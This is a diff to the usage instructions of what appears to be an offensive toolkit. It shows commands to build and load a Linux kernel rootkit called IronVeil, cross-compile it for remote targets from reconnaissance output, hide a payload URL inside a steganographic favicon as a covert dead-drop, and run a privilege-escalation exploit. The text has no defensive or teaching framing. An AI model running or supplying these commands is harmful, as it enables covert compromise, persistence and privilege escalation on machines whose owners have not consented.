@@ -62,10 +62,17 @@ apt install linux-headers-$(uname -r)   # Debian/Ubuntu
 cd Modules/Rootkits && make && sudo insmod ironveil.ko
 # Note: build fails if the module path contains spaces — build from a symlinked path without spaces
 
+# IronVeil: cross-compile .ko for a remote target from Phantom Eye recon output (requires Docker)
+python3 Modules/Rootkits/ironveil_compiler.py "Ubuntu;22.04;5.15.0-127-generic;..."
+# Or explicit args:
+python3 Modules/Rootkits/ironveil_compiler.py --distro Debian --version 12 --kernel 6.1.0-49-amd64
+python3 Modules/Rootkits/ironveil_compiler.py --distro Arch   --kernel 7.0.11-arch1-1 --output /tmp/
+# Supported distro families: Debian/Ubuntu/Kali, Arch/Manjaro, Fedora/RHEL/AlmaLinux/Rocky. DSM raises error with toolkit instructions.
+
 # IronVeil dead-drop: embed payload URL into stego PNG (run once, then host the PNG)
-python3 Modules/Rootkits/stego_embed.py <input_favicon.png> <payload_url> <output.png>
+python3 Modules/Stégano/stego_embed.py <input_favicon.png> <payload_url> <output.png>
 # Verify extraction:
-python3 Modules/Rootkits/stego_embed.py --view <output.png>
+python3 Modules/Stégano/stego_embed.py --view <output.png>
 
 # Privesc: DirtyFrag exploit (CVE)
 cd Modules/Privesc/dirtyfrag && ./exp
